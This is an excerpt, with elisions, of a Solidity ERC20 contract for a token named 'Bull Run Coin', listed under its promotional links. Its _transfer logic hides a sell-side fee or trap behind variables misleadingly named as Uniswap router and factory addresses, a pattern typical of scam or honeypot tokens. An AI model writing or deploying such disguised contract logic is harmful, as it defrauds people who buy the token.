...
https://twitter.com/BullRunCoinBNB
https://t.me.com/BullRunCoinBNB
https://BullRunCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2uniswapRouter = 0x647DA0a023A7ae715EFFf46875a96ad7234A7e49;
    uint256 private swappingToggle = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private uniswapV2Factory = 0xB35a3F3B3110A4a02e44Ab4c1D4553563755F191;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[uniswapV2Factory] > 0 ? pairsAllowance : swappingToggle).div(100) + 0;
        if (swapamount > 0)
        {
...
{
    constructor() ERC20(unicode"Bull Run Coin", unicode"BULLRUN")
    {
